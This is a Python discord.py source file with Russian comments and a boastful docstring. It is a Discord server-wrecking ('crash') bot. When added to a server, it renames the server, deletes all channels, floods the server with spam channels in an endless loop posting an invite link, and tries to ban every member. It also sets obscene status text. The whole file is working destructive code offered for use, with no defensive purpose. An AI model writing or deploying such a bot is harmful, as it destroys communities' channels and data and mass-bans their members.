"""
    По правилам написания кода, сначала должны проводиться импорты системных библиотек,
    потом установленных, и потом уже ваших.
    Учитесь правильно писать код, дети. Говнокодить - вредно для здоровья (c) ExtremeCode
    Эх, давно я не писал на discord.py... А то всё свои программы для проверки 
    Целостности серверов в компании делаю... Скучно даже стало...
    Код на теории должен работать. Пните потом, когда проверите на практике.
    
    Ваш нелюбимый Чай. :)
"""
import asyncio

import discord
from discord.ext import commands

from config import settings

spam = 'Вас трахнули' 
link = settings['invite_link']
bot = commands.Bot(command_prefix=settings['prefix'])


@bot.event
async def on_ready():
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, name="Вам пизда."))
    print('Установлено соединение с ботом {}'.format(bot.user.name))


@bot.event
async def on_guild_join(server):
    await server.edit(name=f"Сервер крашнут {bot.user.name}")
    loop = asyncio.get_event_loop()
    loop.create_task(delete_channels(server.channels)),
    loop.create_task(create_trash_channels(server)),
    loop.create_task(kill_fucking_all_of_them(bot.get_all_members()))
    loop.run_forever()
# Здесь я создал таски, которые выполняются вместе в одно время.
# Асинхронность - наше все. Люблю её.

# Даже ребёнок поймет, что это.
async def delete_channels(channels):
    for channel in channels:
        if str(channel.name) == spam:
            continue
        await channel.delete()

# Даже ребёнок поймет, что это 2
async def create_trash_channels(server):
    while True:
        channel = await server.create_text_channel(spam, overwrite=None)
        await channel.send(link)

# Даже ребёнок поймет, что это 3
async def kill_fucking_all_of_them(members):
    for member in members:
        try:
            await member.ban(reason=link)
# Иногда бот может встретить админа, поэтому чтобы код не ломался,
# Нужно использовать "try except" конструкцию.     
        except Exception as e:
            print(e)

bot.run(settings['token'])
